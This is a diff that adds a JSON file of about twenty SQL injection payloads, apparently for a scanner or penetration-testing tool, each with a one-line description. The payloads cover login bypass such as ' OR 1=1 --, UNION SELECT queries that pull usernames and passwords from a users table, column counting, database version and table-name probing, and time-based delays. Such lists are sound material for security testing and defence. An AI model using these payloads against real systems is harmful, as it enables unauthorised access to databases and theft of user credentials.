@@ -1,0 +1,88 @@
+{
+    "payloads": [
+      {
+        "payload": "' or \"--",
+        "description": "Basic SQL Injection with single quote or double quote to bypass authentication."
+      },
+      {
+        "payload": "' OR 1=1 --",
+        "description": "OR-based SQL Injection to always return true."
+      },
+      {
+        "payload": "\" OR 1=1 --",
+        "description": "Double quote variant of OR-based SQL Injection."
+      },
+      {
+        "payload": "' OR '' = '",
+        "description": "Empty string comparison to bypass validation."
+      },
+      {
+        "payload": "' OR '1' = '1' -- -",
+        "description": "Using '1' = '1' to bypass the SQL query."
+      },
+      {
+        "payload": "' AND 1=1 --",
+        "description": "AND condition to check SQL injection vulnerability."
+      },
+      {
+        "payload": "' AND 1=0 --",
+        "description": "AND condition with false to check SQL injection vulnerability."
+      },
+      {
+        "payload": "' AND 1 -- -",
+        "description": "Basic AND condition to inject into SQL query."
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3--+",
+        "description": "Using UNION SELECT to fetch data from different tables."
+      },
+      {
+        "payload": "' UNION SELECT sum(columnname) FROM tablename --",
+        "description": "Union with SUM aggregation function to test for numeric data retrieval."
+      },
+      {
+        "payload": "' UNION SELECT null, username, password FROM users --",
+        "description": "Basic UNION SELECT to retrieve usernames and passwords."
+      },
+      {
+        "payload": "' ORDER BY 1--+",
+        "description": "Ordering columns to check the number of columns in the result set."
+      },
+      {
+        "payload": "' ORDER BY 2--+",
+        "description": "Check for second column ordering."
+      },
+      {
+        "payload": "' GROUP BY columnnames HAVING 1=1 --",
+        "description": "Using GROUP BY with HAVING clause to test SQL injection."
+      },
+      {
+        "payload": "' AND MID(VERSION(),1,1) = '5';",
+        "description": "Checking SQL server version."
+      },
+      {
+        "payload": "' AND 1 IN (SELECT min(name) FROM sysobjects WHERE xtype = 'U' AND name > '.') --",
+        "description": "Trying to find the name of a table in the database."
+      },
+      {
+        "payload": "' UNION SELECT NULL, username, password FROM users --",
+        "description": "Classic UNION SELECT to extract user credentials."
+      },
+      {
+        "payload": "'; WAITFOR DELAY '0:0:30' --",
+        "description": "Time-based SQL Injection to cause a delay in response."
+      },
+      {
+        "payload": "'; SLEEP(10) --",
+        "description": "Injecting a sleep function to test for time-based vulnerabilities."
+      },
+      {
+        "payload": "1' UNION SELECT 1 INTO @,@",
+        "description": "Union-based SQL injection to assign variables."
+      },
+      {
+        "payload": "1' UNION SELECT 1 INTO @,@,@",
+        "description": "Union-based SQL injection with more variables."
+      }
+    ]
+  }
